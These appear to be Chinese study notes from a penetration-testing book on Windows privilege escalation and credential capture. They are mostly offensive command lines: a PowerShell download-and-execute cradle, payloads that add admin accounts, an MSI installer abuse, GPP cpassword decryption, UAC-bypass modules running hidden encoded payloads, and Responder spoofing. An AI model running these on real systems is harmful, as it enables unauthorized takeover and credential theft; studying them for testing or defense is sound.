# 权限提升分析及防御
+ USER :普通用户权限
+ Administrator :管理员权限
+ System :系统权限
+ TrustedInstaller :windows中最高权限,可以修改系统文件
+ 纵向提权 :低权限角色获得高权限角色的权限
+ 横向提权 :获取同级别角色权限,例如,在A系统中获取了系统B的权限
## 4.1 系统内核溢出漏洞提权
### 4.1.1 通过手动执行命令发现缺失补丁
//查看当前权限
`whoami /groups`
//获取系统信息
`systeminfo`
//列出已经安装的补丁
`wmic qfe get Caption,description,hotfixid,installedon`
//直接查找是否安装指定的补丁
`wmic qfe get Caption,description,hotfixid,installedon | findstr /C:"KB3143141" /C:"KB76902"`
### 4.1.2 利用metasploit发现缺失补丁
//根据漏洞编号快速找出系统中缺少的补丁
`post/windows/gather/enum_patches`
//快速识别系统中可能被利用的漏洞,类似Windows exploit suggester
`post/multi/recon/local_exploit_suggester`

### 4.1.3 Windows exploit suggester
```
//更新漏洞库
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py -d 漏洞库 -i systeminfo.txt
```
### 4.1.4 Powershell中的Sherlock脚本
```powershell
import-module c:\sherlock.ps1
//搜索所有未安装的补丁
Find-allVulns
//搜索指定补丁
powershell Find-MS14058
```
## 4.2 windows操作系统配置错误利用分析及防御
### 4.2.1 系统服务权限配置错误
> 服务未运行 :使用任意服务替换原来的服务,然后重启服务
> 服务这些横在运行且无法被终止 :利用DLL劫持技术并重启服务
+ PowerUP下的实战利用 (powershell)
//本地
``
powershell.exe -exec bypass -command "& {import-module .\powerup.ps1; invoke-allchecks}"
``
//远程
```
powershell.exe -nop -exec bypass -c "iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUP/PowerUP.ps1'); invoke-AllChecks"
```
//metasploit中运行
略
> powerup列出了可能存在问题的搜有服务,并在AbuseFunction部分给出了利用方式
> 根据AbuseFunction部分给出的利用方式,利用install-sercvicebinary模块,通过weite-servicebinary编写一个C#服务来添加用户
```
powershell.exe -nop -exec bypass IEX (new-object Net.webclient).downloadstring('c:/powerup.ps1');install-servicebinary -servicename 'OmniServers' -UserName shuteer -Password Password123!
```
+ metesploit下实战利用
> service_permissions模块使用两种方法来获取system权限,如果meterpreter以管理员权限运行,该模块会尝试创建并运行一个新的服务.如果当前权限不允许创建服务,该模块会判断那些服务的文件或者文件夹的权限有问题,并允许对其进行劫持.在创建服务或者劫持已经存在的服务时,该模块会创建一个可执行程序,其文件名和安装路径都是随机的
> AGGRESSIVE选项为false时(默认),该模块在第一次提全成功后就会停止工作
`exploit/windows/local/service_permissions`
### 4.2.2 注册表键AlwayslnstallElevated
> 注册表键AlwayslnstallElevated是一个策略设置项,windows允许低权限用户一system权限运行安装文件,如果启用此策略设置项,那么任何权限的用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件
+ pathAlwayslnstallElevated漏洞产生原因(182页)
原因:用户开启了windows installer特权安装功能
+ PowerUP下的实战利用
```powershell
//导入powerup.ps1
powershell.exe -nop -exec bypass IEX (New-Object Net.WebClient).DownLoadString('C:/powerup.ps1')
//检测注册表键值是否被设置
Get-Registryalwaysinstallelevated
//使用write-useraddmsi模块生成添加账户的msi文件(useradd.msi)
Write-UserAddMsi
//以普通用户权限运行useradd.msi
msiexec /qn /i /quiet useradd.msi
// /quite:安装过程中禁止向用户发送消息 /qu:不使用GUI /i:安装程序
```
### 4.2.3 可信任服务路径漏洞
+ Trusted service paths漏洞产生原因(184页)
+ metesploit下的实战利用
```
use exploit/windows/local/trusted_service_path
set payload ......
set AutoRunScript migrate -f
```
> 反弹的新的meterpreter会很快中断(原因186页),可以使用set AutoRunScript migrate -f自动迁移进程
+ 手动实战利用
//列出机器中搜有没有被引号引起来的服务的路径
`wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
//使用windows内置工具icacls检查目录权限,此处使用C:\Program Files做例子
`icacls "C:\Program Files"`
|perm(权限掩码)|说明|
|----|----|
|Everyone |所有用户对这个文件夹都有完全控制权限|
|(M) |修改|
|(F) |完全控制|
|(CI) |从属容器将继承访问控制项|
|(OI) |从属文件将继承访问控制项|
> Everyone:(OI)(CI)(F)  的意思是,对文件夹,用户有读写删除其下文件. 删除其子目录的权限
确认目标机器中存在此漏洞后,把要上传的程序重命名并放置在存在此漏洞且可写的目录下
```cmd
//停止服务
sc stop sercive_name
//启动服务
sc start service_name
```
### 4.2.4 自动安装配置文件
+ 原理
利用网络管理员的脚本化批量部署方法的配置文件
部分文件列举
> C:\sysprep.inf
> C:\sysprep\sysprep.xml
> C:\windows\system32\sysprep.inf
> C:\\windows\system32\sysprep\sysprep.xml
> C:\unattend.xml
> C:\windows\panther\unattend.xml
> C:\windows\panther\unattended.xml
> C:\windows\panther\unattend\unattended.xml
> C:\windows\panther\unattend\unattend.xml
> C:\windows\system32\sysprep\unattend.xml
> C:\windows\system32\sysprep\panther\unattend.xml
//搜索C盘下的unattend.xml文件
`dir /c /s c:\unattend.xml`
+ metesploit的利用模块
`post/windows/gather/enum_unattend`
### 4.2.5 计划任务
//查看当前计算机的计划任务
`schtasks /query /fo LIST /v`
若显示无法加载列资源,先更改cmd的编码
`chcp 437`
+ AccessCHK.exe
> 微软官方提供的工具
> 如果攻击者对以高权限运行的任务所在的目录具有写权限,就可以使用恶意程序覆盖原来的程序
//查看指定目录的权限配置情况
`accesschk.exe -dqv "C:\Microsoft" -accepteula`
常用accesschk命令
```cmd
//第一次运行sysinternals工具包中的工具时,会弹出一个许可协议对话框,可以使用/accepteula自动接受许可协议
accesschk.exe /accepteula
//列出某个驱动器下所有权限配置有缺陷的文件夹
accesschk.exe -uwdqsUsersc:\
accesschk.exe -uwdqs"AuthenticatedUsers"c:\
//列出某个驱动器下所有权限配置有缺陷的文件
accesschk.exe -uwqsUsersc:\*.*
accesschk.exe -uwqs"AuthenticatedUsers"c:\*.*
```
### 4.2.6 Empire内置模块
Empire内置了powerup的部分模块,输入`usemodele privese/powerup`然后按"TAB"键查看内置的powerup模块列表
+ ALLChecks模块
```
usemodule privesc/powerup/allchecks
execute
```
Allchecks模块的应用对象如下
> 没有被引号引起来的服务路径
> ACL配置错误的服务(攻击者通常通过"service_*"利用它)
> 服务的可执行文件的权限设置不当(攻击者通常通过"service_exe_*"利用它)
> Unattend.xml文件
> 注册表键Alwaysinstallelevated
> 如果有Autologon凭证,都会留在注册表中
> 加密的web.config字符串和应用程序池的密码
> %PATH%.DLL的劫持机会(攻击者通常通过write_dllhijacker利用它)
## 4.3 组策略首选项提全分析及防范
### 4.3.1 组策略首选项提权简介(190页)
常见的组策略首选项(Group Policy Preferences,GPP):
> 映射驱动器(Drives.xml)
> 创建本地用户
> 数据源(DataSources.xml)
> 打印机配置(Printers.xml)
> 创建/更新服务(Services.xml)
> 计划任务(ScheduledTacks.xml)
### 4.3.2 组策略首选项提权分析(191页)
+ 创建组策略,批量修改域中机器的本地管理员密码(191页)
//这特莫都有了可以修改组策略的权限了......, 提权方式主要是看下一步
+ 获取组策略的凭据
> 管理员在域中新建里一个组策略后,操作系统会自动在SYSVOL共享目录中生产一个XML文件该文件保存里该组策略更新后的密码(针对第一步而言,第一步是创建一个修改域中机器本地管理员密码的组策略,所以这一步的xml文件中会保存密码,密码是在创建组策略时就设定好的)
> 该密码使用AES-256加密算法,2012年微软公布了该密码的私钥
> 任何域用户和域信任的用户均可访问该共享目标(目录SYSVOL)
> 也可以参考:https://adsecurity.org/?p=2288
1):手动查找cpassword
文件夹在域控制器的SYSVOL共享目录中
`\sysvol\域名\Policies\组策略的GUID\MACHINE\Preferences\Groups\Groups.xml`
//命令行下查看
`type \\dc\sysvol\域名\Policies\组策略的GUID\MACHINE\Preferences\Groups\Groups.xml`
//对密码解密
`python gpprefdecrypt.py 密文`
2):使用powersploit获取cpassword(powershell)
`Get-GPPPassword.ps1`	//脚本名称,此处没详细列出命令(如导入脚本等)
3):使用metasploit查找cpassword
`post/windows/gather/credentials/gpp`
4):使用Empire查找cpassword
`usemodule privesc/gpp`
其他组策略首选项文件中可能存在cpassword的文件
> Services\Services.xml
> ScheduledTasks\ScheduledTasks.xml
> Printers\Printers.xml
> Drives\Drives.xml
> DataSources\DataSources.xml
+ 防御(195页)
KB2962486补丁
## 4.4 绕过UAC提权分析及防范
> User Account Control 用户账户控制  windows Vista和以后的版本中(197页)
### 4.4.3 metasploit
+ bypassuac模块
> 当前用户必须在管理员组中
> UAC必须为默认设置:仅在程序试图更改我的计算机时通知我
```
//会创建多个文件,可能会被查杀
exploit/windows/local/bypassuac
//直接运行在内存的反射DLL中,不接触目标机器硬盘
exploit/windows/local/bypassuac_injection 
```
+ RunAs模块
> 会创建一个可执行文件,目标机器运行一个发起提升权限请求的程序(弹框),需用户选择"是"
> 当前用户必须在管理员组中,并且知道管理员的密码
> 对UAC设置没有要求
> 需要使用EXE::Custom选项创建一个可执行文件(需进行免杀处理)
`exploit/windows/local/ask`
### 4.4.4 Nishang
+ Invoke-PsUACme模块
```
//使用sysprep方法并执行默认的payload
Invoke-PsUACme -Verbose
//使用oobe方法并执行默认payload
Invoke-PsUACme -method oobe -Verbose
//使用-payload参数,自行指定要执行的payload
Invoke-PsUACme -method oobe -payload "powershell -windowstyle hidden -e 编码的payload代码"
//指定payload路径
-PayloadPath
//自定义DLL文件
-CustomDLL64		//64位
-CustomDLL32		//32位
```
### 4.4.5 Empire
+ bypassuac模块
`usemadole pricvesc/bypassuac`
+ bypassuac_wscript模块
> 只适用windows7
> 使用c:\windows\script.exe执行payload,绕过UAC
`usemadole pricvesc/bypassuac_wscript`
### 4.4.6 针对绕后UAC提全的防御措施(201页)
## 4.5 令牌窃取分析及防范(201页)
+ 令牌窃取
+ rotten potato本地提权分析
+ 添加域管理员
+ Empire下的令牌窃取分析
+ 针对令牌窃取提权的防御措施
## 4.6 无凭证条件下的权限获取分析及防范
### 4.6.1 LLMNR和NetBios欺骗攻击的基本概念
+ LLMNR
> 本地链路多播名称解析(LLMNR)是一种域名系统数据包格式,当局域网中的DNS服务器不可用时,DNS客户端会使用LLMNR解析本地网段中机器的名称,直到DNS服务器恢复正常为止
> windows vista本本开始支持LLMNR,LLMNR支持IPV6
LLMNR的工作流程如下
1) DNS客户端在自己的内部名称缓存中查询名称
2) 如果没有找到,主机将向DNS发送名称查询请求
3) 如果主DNS没有回应或者收到了错误的信息,这些户籍会向备DNS发送查询请求
4) 如果备DNS没有回应或者收到错误的信息,将使用LLMNR进行解析
5) 主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求,以获取主机名所对应的IP地址,查询范围仅限于本地子网
6) 本地子网中所有支持LLMNR的主机在收到查询请求后,会比对自己的主机名,如果不同就丢弃,如果相同,就向查询主机发送包含自己IP地址的单播信息
+ NetBios
> NetBios是一种网络协议,根据NetBios协议广播获得计算机名称,并将其解析为相应的IP地址
> windows NT以后版本的所有操作系统中均可使用NetBios,不支持IPV6
NetBios提供的三种服务如下
1) NetBios-NS(名称服务):主要用于名称注册和解析,以启动会话和分发数据包,该服务需要使用域名服务器来注册NetBios名称,默认监听UDP137端口,也可以使用TCP137端口
2) Datagram Distribution Service(数据报分发服务器):无连接服务,该服务负责进行错误检测和恢复,默认监听UDP138端口
3) Session Service(会话服务):允许两台计算机建立连接,允许电子邮件跨越多个数据包进行传输,提供错误检测和恢复机制,默认使用TCP139端口
+ Net-NTLM Hash
> NTLM Hash是指windows操作系统的security asscout manager中保存的用户密码散列值,通常保存在windows的SAM文件或者NTDS.DIT数据库中,用于对访问资源的用户进行身份验证
> Net-NTLM Hash 是指在网络环境这些红经过NTLM认证的散列值,挑战/响应验证中的"响应"就包含Net-NTLM Hash.使用Responder抓取的通常就是Net-NTLM Hash.攻击者无法使用该散列值进行哈希传递攻击,只能在使用Hashcat等工具得到明文后进行横向移动攻击
### 4.6.2 LLMNR和NetBios欺骗攻击分析
> 目标网络的DNS服务器因发生故障而无法提供服务时,会退回LLMNR和NetBios进行计算机名解析
+ Responder
> 监听LLMNR和NBT-NS协议的工具之一,能够抓取网络中所有的LLMNR和NBT-NS请求并进行响应,获取最初的账户凭证
> 内置SMB认证服务器.MSSQL认证服务器,HTTP认证服务器,HTTPS认证服务器,LDAP认证服务器,DNS服务器,WPAD代理服务器,以及FTP,POP3,IMAP,SMTP等服务器,收集目标网络中计算机的凭据
> 还可以通过Multi-Relay功能在目标系统中执行命令
https://github.com/SpiderLabs/Responder
书中未过多介绍使用方法,请自行研究